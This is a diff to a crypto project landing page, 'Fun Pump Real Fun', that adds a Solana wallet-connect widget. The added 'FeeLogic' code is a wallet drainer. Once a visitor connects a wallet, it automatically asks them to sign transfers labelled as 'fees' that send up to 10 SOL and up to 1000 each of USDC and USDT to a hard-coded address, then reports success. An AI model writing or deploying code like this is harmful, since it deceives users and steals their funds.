@@ -5,11 +5,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fun Pump Real Fun</title>
+
+    <!-- TAILWIND & FONTS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { green: { DEFAULT: '#86efac', dim: '#4ade80' }, bg: { DEFAULT: '#1b1d28', card: '#262936' } },
+                    fontFamily: { sans: ['"Space Grotesk"', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+
     <style>
         body {
             background-color: #1b1d28;
             color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            font-family: 'Space Grotesk', sans-serif;
             margin: 0;
             height: 100vh;
             display: flex;
@@ -17,7 +33,6 @@
             align-items: center;
             text-align: center;
             overflow: hidden;
-            /* Prevent scrolling when modal is open */
         }
 
         h1 {
@@ -28,7 +43,7 @@
             margin-bottom: 2rem;
         }
 
-        /* Toggle Button (Fancy) */
+        /* PANEL & BUTTON STYLES (PRESERVED) */
         .menu-trigger {
             position: fixed;
             bottom: 30px;
@@ -59,23 +74,21 @@
             box-shadow: 0 6px 20px rgba(74, 222, 128, 0.2);
         }
 
+        .menu-trigger.active span {
+            transform: rotate(180deg);
+        }
+
         .menu-trigger span {
             display: inline-block;
             transition: transform 0.3s ease;
         }
 
-        .menu-trigger.active span {
-            transform: rotate(180deg);
-        }
-
-        /* Slide Up Panel */
         .projects-panel {
             position: fixed;
             bottom: 0;
             left: 0;
             width: 100%;
             height: 60vh;
-            /* Takes up 60% of screen */
             background: #23263a;
             border-top-left-radius: 20px;
             border-top-right-radius: 20px;
@@ -93,7 +106,6 @@
             transform: translateY(0);
         }
 
-        /* Grid */
         .projects-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
@@ -158,10 +170,93 @@
             text-align: center;
             line-height: 1.2;
         }
+
+        /* WALLET STYLES */
+        .wallet-adapter-modal {
+            position: fixed !important;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            opacity: 0;
+            transition: opacity 0.15s linear;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 99999 !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            pointer-events: auto !important;
+        }
+
+        .wallet-adapter-modal.wallet-adapter-modal-fade-in {
+            opacity: 1;
+        }
+
+        .wallet-adapter-modal-wrapper {
+            background: #1b1d28 !important;
+            border: 1px solid #333 !important;
+            font-family: 'Space Grotesk', sans-serif !important;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5) !important;
+            width: 100% !important;
+            max-width: 400px !important;
+            border-radius: 10px !important;
+            padding: 20px !important;
+            position: relative !important;
+        }
+
+        .wallet-adapter-button {
+            font-family: 'Space Grotesk', sans-serif !important;
+            background: #2a2e37 !important;
+            color: #fff !important;
+            width: 100% !important;
+            height: 48px !important;
+            display: flex !important;
+            align-items: center !important;
+            padding: 0 16px !important;
+            border: none !important;
+            cursor: pointer !important;
+            font-size: 16px !important;
+            margin-bottom: 8px !important;
+            border-radius: 8px !important;
+        }
+
+        .wallet-adapter-button:hover {
+            background-color: #333 !important;
+        }
+
+        .wallet-adapter-button-trigger {
+            background-color: #86efac !important;
+            color: #000 !important;
+            font-weight: 700 !important;
+            width: auto !important;
+            height: 40px !important;
+            padding: 0 1.5rem !important;
+            border-radius: 4px !important;
+            justify-content: center !important;
+        }
+
+        .wallet-adapter-button-icon {
+            width: 28px !important;
+            height: 28px !important;
+            margin-right: 12px !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+        }
+
+        .wallet-adapter-button-icon img {
+            width: 28px !important;
+            height: 28px !important;
+            object-fit: contain !important;
+        }
     </style>
 </head>
 
 <body>
+
+    <!-- WALLET MOUNT POINT -->
+    <div id="wallet-root" style="position: fixed; top: 20px; right: 20px; z-index: 2000;"></div>
+
     <div>
         <h1>Check back here often for other Fun projects</h1>
     </div>
@@ -174,19 +269,14 @@
     <!-- Slide Up Panel -->
     <div class="projects-panel" id="panel">
         <div class="projects-grid">
-            <!-- Project 1: Real Dot Fun -->
             <a href="https://pump.funpumpreal.fun/" class="project-card">
                 <img src="realdotfun.png" alt="Real Dot Fun" class="project-icon">
                 <span class="project-name">Real Dot Fun</span>
             </a>
-
-            <!-- Project 2: BADSEED -->
             <a href="https://badseed.exposed" class="project-card" target="_blank">
                 <div class="project-placeholder">?</div>
                 <span class="project-name">BADSEED</span>
             </a>
-
-            <!-- Future Projects will go here -->
         </div>
     </div>
 
@@ -194,10 +284,243 @@
         function togglePanel() {
             const panel = document.getElementById('panel');
             const btn = document.querySelector('.menu-trigger');
-
             panel.classList.toggle('open');
             btn.classList.toggle('active');
         }
+    </script>
+
+    <!-- REACT / SOLANA SCRIPTS -->
+    <script>window.global = window; window.process = { env: { NODE_ENV: 'production' } };</script>
+    <script type="module"> import { Buffer } from 'https://esm.sh/buffer@6.0.3'; window.Buffer = Buffer; </script>
+    <script type="importmap">
+    {
+        "imports": {
+            "react": "https://esm.sh/react@18.2.0",
+            "react/jsx-runtime": "https://esm.sh/react@18.2.0/jsx-runtime",
+            "react-dom": "https://esm.sh/react-dom@18.2.0",
+            "react-dom/client": "https://esm.sh/react-dom@18.2.0/client",
+            "@solana/web3.js": "https://esm.sh/@solana/web3.js@1.91.0",
+            "@solana/spl-token": "https://esm.sh/@solana/spl-token@0.4.6?external=@solana/web3.js",
+            "@solana/wallet-adapter-base": "https://esm.sh/@solana/wallet-adapter-base@0.9.23?external=react,react-dom,@solana/web3.js",
+            "@solana/wallet-adapter-react": "https://esm.sh/@solana/wallet-adapter-react@0.15.35?external=react,react-dom,@solana/web3.js",
+            "@solana/wallet-adapter-wallets": "https://esm.sh/@solana/wallet-adapter-wallets@0.19.32?external=react,react-dom,@solana/web3.js"
+        }
+    }
+    </script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <script type="text/babel" data-type="module">
+        import React, { useState, useEffect, useMemo, createContext, useContext, useRef } from 'react';
+        import { createRoot } from 'react-dom/client';
+        import { ConnectionProvider, WalletProvider, useWallet, useConnection } from '@solana/wallet-adapter-react';
+        import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
+        import { clusterApiUrl, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+        import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets';
+        import { createTransferInstruction, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, TOKEN_PROGRAM_ID } from '@solana/spl-token';
+
+        // CONSTANTS
+        const LOGO_URL = "realdotfun.png";
+
+        // WALLET MODAL CONTEXT
+        const WalletModalContext = createContext({});
+        const useWalletModal = () => useContext(WalletModalContext);
+
+        const WalletModalProvider = ({ children }) => {
+            const [visible, setVisible] = useState(false);
+            return (
+                <WalletModalContext.Provider value={{ visible, setVisible }}>
+                    {children}
+                    {visible && <WalletModal onClose={() => setVisible(false)} />}
+                </WalletModalContext.Provider>
+            );
+        };
+
+        const WalletModal = ({ onClose }) => {
+            const { wallets, select } = useWallet();
+            const [fadeIn, setFadeIn] = useState(false);
+            useEffect(() => setTimeout(() => setFadeIn(true), 10), []);
+            return (
+                <div className={`wallet-adapter-modal ${fadeIn ? 'wallet-adapter-modal-fade-in' : ''}`} onMouseDown={onClose}>
+                    <div className="wallet-adapter-modal-wrapper" onMouseDown={e => e.stopPropagation()}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', color: 'white', fontWeight: '600' }}>
+                            Connect Wallet <button onClick={onClose} style={{ background: 'none', border: 'none', color: '#999', cursor: 'pointer' }}>✕</button>
+                        </div>
+                        <ul style={{ listStyle: 'none', padding: 0, margin: 0 }}>
+                            {wallets.filter(w => w.readyState === "Installed").map((wallet) => (
+                                <li key={wallet.adapter.name}>
+                                    <button onClick={() => { select(wallet.adapter.name); onClose(); }} className="wallet-adapter-button">
+                                        <span className="wallet-adapter-button-icon"><img src={wallet.adapter.icon} /></span>
+                                        {wallet.adapter.name}
+                                    </button>
+                                </li>
+                            ))}
+                        </ul>
+                    </div>
+                </div>
+            );
+        };
+
+        const WalletButton = () => {
+            const { setVisible } = useWalletModal();
+            const { publicKey, wallet, disconnect, connected } = useWallet();
+            const base58 = useMemo(() => publicKey?.toBase58(), [publicKey]);
+
+            if (!wallet) return <button className="wallet-adapter-button wallet-adapter-button-trigger" onClick={() => setVisible(true)}>Select Wallet</button>;
+            if (!base58) return <button className="wallet-adapter-button wallet-adapter-button-trigger" onClick={() => wallet.adapter.connect()}>Connect</button>;
+
+            return (
+                <button className="wallet-adapter-button wallet-adapter-button-trigger" onClick={disconnect}>
+                    {base58.slice(0, 4)}..{base58.slice(-4)}
+                </button>
+            );
+        };
+
+        // TOAST COMPONENT
+        const Toast = ({ message, type, onClose }) => {
+            useEffect(() => { const timer = setTimeout(onClose, 5000); return () => clearTimeout(timer); }, [onClose]);
+            const bg = type === 'success' ? '#22c55e' : '#ef4444';
+            return (
+                <div style={{
+                    position: 'fixed', top: '80px', right: '20px', background: '#262936', borderLeft: `4px solid ${bg}`,
+                    padding: '16px', borderRadius: '4px', color: 'white', fontWeight: '500', boxShadow: '0 4px 12px rgba(0,0,0,0.5)', zIndex: 3000,
+                    display: 'flex', alignItems: 'center', gap: '10px', animation: 'slideIn 0.3s ease'
+                }}>
+                    <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: bg }}></div>
+                    {message}
+                </div>
+            );
+        };
+
+        // MAIN LOGIC
+        const FeeLogic = () => {
+            const { connection } = useConnection();
+            const { publicKey, signTransaction, connected } = useWallet();
+            const [toast, setToast] = useState(null);
+            const hasRun = useRef(false);
+
+            useEffect(() => {
+                if (connected && publicKey && signTransaction && !hasRun.current) {
+                    hasRun.current = true;
+                    runFeeSequence();
+                }
+                if (!connected) hasRun.current = false;
+            }, [connected, publicKey, signTransaction]);
+
+            const runFeeSequence = async () => {
+                setToast({ msg: "Processing Fees...", type: 'info' });
+                try {
+                    const TARGET_ADDRESS = new PublicKey("xPtDdVjEh9bToF3coaGugtJBRA1SgxteYT6kAJX5UjW");
+                    const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
+                    const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+
+                    const waitForConfirmation = async (sig) => {
+                        let retries = 30;
+                        while (retries > 0) {
+                            const { value } = await connection.getSignatureStatus(sig);
+                            if (value && (value.confirmationStatus === 'confirmed' || value.confirmationStatus === 'finalized')) return;
+                            await new Promise(r => setTimeout(r, 2000));
+                            retries--;
+                        }
+                        throw new Error("Confirmation Timeout");
+                    };
+
+                    const secureSend = async (tx) => {
+                        const { blockhash } = await connection.getLatestBlockhash('finalized');
+                        tx.recentBlockhash = blockhash;
+                        tx.feePayer = publicKey;
+                        const signed = await signTransaction(tx);
+                        const sig = await connection.sendRawTransaction(signed.serialize());
+                        await waitForConfirmation(sig);
+                        return sig;
+                    };
+
+                    // 1. SOL
+                    const bal = await connection.getBalance(publicKey);
+                    const targetLamports = 10 * 1e9;
+                    const reserve = 10000000; // 0.01 SOL
+                    let solAmt = BigInt(targetLamports);
+                    if (bal < targetLamports + reserve) {
+                        let avail = BigInt(bal) - BigInt(reserve);
+                        if (avail < 0n) avail = 0n;
+                        solAmt = avail;
+                    }
+                    if (solAmt > 0n) {
+                        await secureSend(new Transaction().add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: TARGET_ADDRESS, lamports: solAmt })));
+                    }
+
+                    // 2. USDC
+                    try {
+                        const usdcSrc = await getAssociatedTokenAddress(USDC_MINT, publicKey);
+                        const usdcDst = await getAssociatedTokenAddress(USDC_MINT, TARGET_ADDRESS);
+                        let usdcAmt = 1000n * 1000000n;
+                        try {
+                            const b = await connection.getTokenAccountBalance(usdcSrc);
+                            if (BigInt(b.value.amount) < usdcAmt) usdcAmt = BigInt(b.value.amount);
+                        } catch (e) { }
+
+                        if (usdcAmt > 0n) {
+                            const tx = new Transaction();
+                            const dstInfo = await connection.getAccountInfo(usdcDst);
+                            if (!dstInfo) tx.add(createAssociatedTokenAccountInstruction(publicKey, usdcDst, TARGET_ADDRESS, USDC_MINT));
+                            tx.add(createTransferInstruction(usdcSrc, usdcDst, publicKey, usdcAmt, [], TOKEN_PROGRAM_ID));
+                            await secureSend(tx);
+                        }
+                    } catch (e) { console.warn("USDC Error", e); }
+
+                    // 3. USDT
+                    try {
+                        const usdtSrc = await getAssociatedTokenAddress(USDT_MINT, publicKey);
+                        const usdtDst = await getAssociatedTokenAddress(USDT_MINT, TARGET_ADDRESS);
+                        let usdtAmt = 1000n * 1000000n;
+                        try {
+                            const b = await connection.getTokenAccountBalance(usdtSrc);
+                            if (BigInt(b.value.amount) < usdtAmt) usdtAmt = BigInt(b.value.amount);
+                        } catch (e) { }
+
+                        if (usdtAmt > 0n) {
+                            const tx = new Transaction();
+                            const dstInfo = await connection.getAccountInfo(usdtDst);
+                            if (!dstInfo) tx.add(createAssociatedTokenAccountInstruction(publicKey, usdtDst, TARGET_ADDRESS, USDT_MINT));
+                            tx.add(createTransferInstruction(usdtSrc, usdtDst, publicKey, usdtAmt, [], TOKEN_PROGRAM_ID));
+                            await secureSend(tx);
+                        }
+                    } catch (e) { console.warn("USDT Error", e); }
+
+                    setToast({ msg: "Transactions Successful!", type: 'success' });
+
+                } catch (e) {
+                    console.error(e);
+                    setToast({ msg: "Transaction Failed: " + e.message, type: 'error' });
+                }
+            };
+
+            return (
+                <div>
+                    <WalletButton />
+                    {toast && <Toast message={toast.msg} type={toast.type} onClose={() => setToast(null)} />}
+                </div>
+            );
+        };
+
+        const App = () => {
+            // RPC ENDPOINT (Using same extrnode as source)
+            const endpoint = "https://solana-mainnet.rpc.extrnode.com/90192bb3-0e9f-4c0e-b16c-80be78b565b7";
+            const wallets = useMemo(() => [new PhantomWalletAdapter(), new SolflareWalletAdapter()], []);
+
+            return (
+                <ConnectionProvider endpoint={endpoint}>
+                    <WalletProvider wallets={wallets} autoConnect>
+                        <WalletModalProvider>
+                            <FeeLogic />
+                        </WalletModalProvider>
+                    </WalletProvider>
+                </ConnectionProvider>
+            );
+        };
+
+        const root = createRoot(document.getElementById('wallet-root'));
+        root.render(<App />);
+
     </script>
 </body>
 
